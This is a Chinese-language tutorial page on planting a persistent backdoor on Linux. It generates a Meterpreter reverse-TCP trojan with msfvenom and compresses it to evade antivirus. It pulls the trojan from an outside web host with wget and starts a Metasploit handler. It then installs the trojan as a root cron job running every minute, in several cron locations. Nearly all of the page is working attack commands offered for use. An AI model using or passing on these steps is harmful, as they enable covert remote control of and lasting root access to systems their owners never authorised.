---
layout: default
title: 给Linux植入永久后门
---

# 生成meterpreter文件木马

```bash
mkdir -p /root/temp/
cd /opt/metasploit-framework/
./msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf lhost=172.20.0.4 lport=4444 -o /root/temp/shell
# 制作文件木马
# -p 载荷
# -f elf Linux可执行文件
# localhost 本地主机，木马是客户端
# localport 本地端口
# output
```

# 把木马整到目标上去

```bash
cd /root/temp/
tar -czvf shd.tar.gz shell
# 压缩解决报毒
# 把shell放到我的 web上去
wget http://www.lu555.site/shd.tar.gz
tar -xzvf shd.tar.gz
chmod 777 shell
```

# 木马连接测试

```bash
# 本地开始监听
use exploit/multi/handler
# 通用木马服务端
set payload linux/x86/meterpreter/reverse_tcp
set lhost 172.20.0.4
set lport 4444
show options
run
./shell&
# 后台运行木马
ps aux | grep shell
pgrep shell -l
```

# meterpreter Linux文件木马功能

```bash
# linux meterpreter
getuid
shell
crtl + C 
ps
ps -S "shell"
# linux bash ps命令常用这两个：
ps aux 
ps aux | grep shell
pgrep shell -l
```

# 设置计划任务，设置木马客户端间隔自启

## 重启计划任务

```bash
# 计划任务要生效通常不需要重启，即改即生效
# 也可以重启一下来进一步确保没问题
systemctl restart cron
service cron restart
/etc/init.d/cron restart
```

## crontab编辑器-/var/spool/cron/crontabs/root方式

### crontab编辑器是咋回事？

> * 使用crontab编辑器编辑，其实就是编辑/var/spool/cron/crontabs/root文件
> 
> * 编辑的是当前用户的计划任务
> 
> * root用户root文件，zhangsan用户zhangsan文件

### 查看当前用户crontab

```bash
crontab -l 
ls -lah /var/spool/cron/crontabs/root
# 权限必须是600
# 归属必须是 root:crontab(当前用户：crontab)
cat /var/spool/cron/crontabs/root
pgrep shell -l
```

### 新增计划任务

#### 正常编辑crontab

```bash
EDITOR=vim crontab -e
# edit编辑计划任务
# m h  dom mon dow   command
# 分、时、day of month、月、day of week
# 30 * * * * com1 每小时的第30分执行command1
# 30 10 7 * * com2 每月的7号的10点30执行command2
# 30 10 * * 4 com3 每周四的10点30执行command3
# * * * * * com4 默认的每分钟执行一次command4
添加* * * * * /shell&
```

#### 一条命令使用crontab编辑器

```bash
(crontab -l 2>/dev/null;echo "* * * * * /shell&") | crontab -
# 列出当前crontab
# 报错丢弃
# 组合新增
# 传给crontab
# - 标准输入
```

#### 直接编辑/var/spool/cron/crontabs/root

```bash
echo "* * * * * /shell&" > /var/spool/cron/crontabs/root
# 没有直接覆盖
echo "* * * * * /shell&" >> /var/spool/cron/crontabs/root
# 有就追加
chown root:crontab /var/spool/cron/crontabs/root
chmod 600 /var/spool/cron/crontabs/root
```

### 删除计划任务

#### 正常编辑crontab删除

```bash
EDITOR=vim crontab -e
```

#### 直接编辑/var/spool/cron/crontabs/root删除

```bash
rm -rf /var/spool/cron/crontabs/root
# 添加文件了就删文件
sed -i '$d' /var/spool/cron/crontabs/root
# 添加行了就删行
# sed流文本编辑器
# -i 就地处理文件
# '$d'删除最后一行
```

## 通过/etc/cron.d/目录下的配置文件

### /etc/cron.d/目录下的配置文件的说明

> * 是系统的计划任务配置文件
> 
> * 配置文件中需写明用户
> 
> * 你想让root用户后门自启，配置文件就写root，后门命令以root权限执行

### 查看计划任务

```bash
ls -lah /etc/cron.d/
ls -lah /etc/cron.d/shell
# 权限必须是644
# 归属必须是 root:root
cat /etc/cron.d/shell
pgrep shell -l
```

### 新增计划任务

```bash
echo "* * * * * root /shell&" > /etc/cron.d/shell
chmod 644 /etc/cron.d/shell
chown root:root /etc/cron.d/shell
```

### 删除计划任务

```bash
rm -rf /etc/cron.d/shell
```

## 通过/etc/crontab文件

### /etc/crontab文件有什么性质？

> * 是系统计划任务配置文件
> 
> * 需要指明用户
> 
> * 让root用户自动后门，配置文件就得写root，后门命令以root权限执行，完美兼容想让root用户自动后门的目标

### 查看当前计划任务

```bash
ls -lah /etc/crontab
# 权限必须是644
# 归属必须是 root:root
cat /etc/crontab
pgrep shell -l
```

### 创建计划任务

```bash
echo "* * * * * root /shell&" >> /etc/crontab
chmod 644 /etc/crontab
chown root:root /etc/crontab
```

### 删除计划任务

```bash
sed -i '$d' /etc/crontab
```


